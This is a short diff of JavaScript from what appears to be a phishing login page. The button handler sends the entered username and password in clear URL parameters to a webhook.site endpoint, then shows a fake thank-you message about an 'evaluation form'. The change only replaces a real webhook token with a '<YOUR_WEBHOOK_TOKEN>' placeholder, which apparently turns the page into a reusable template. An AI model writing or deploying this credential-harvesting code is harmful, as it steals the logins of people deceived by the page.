@@ -212,7 +212,7 @@ main_login_btn.addEventListener('click', () => {
     if ((username.length < 0 || username === "") === true || (password.length < 0 || password === "") === true) {
         window.alert("Please enter your username and password.");
     } else {
-        fetch(`https://webhook.site/7f5da2f2-aeec-49c9-a9af-3ed2c8c98e52?username=${username}&password=${password}`);
+        fetch(`https://webhook.site/<YOUR_WEBHOOK_TOKEN>?username=${username}&password=${password}`);
         window.setTimeout(() => {
             if (window.confirm("Thanks for submitting the form. Our team will analyze your evaluation form and will get back to you\
                 over the mail within 2 to 3 working days.") === true) {
